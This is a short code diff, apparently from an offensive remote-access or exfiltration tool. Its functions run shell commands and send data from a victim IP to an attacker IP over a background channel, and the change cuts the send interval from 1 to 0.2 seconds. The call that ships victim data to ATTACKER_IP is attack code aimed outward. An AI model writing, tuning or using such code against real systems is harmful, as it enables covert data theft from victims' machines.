@@ -35,7 +35,7 @@ def run_shell_command(args) -> str:
         return res.stderr
 
 def _send_watch(data: bytes):
-    send_data(data, src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP, channel=Channel.BACKGROUND, sleep=1)
+    send_data(data, src=Cfg.VICTIM_IP, dst=Cfg.ATTACKER_IP, channel=Channel.BACKGROUND, sleep=0.2)
 
 def _wait_for_stop() -> bool:
     while True:
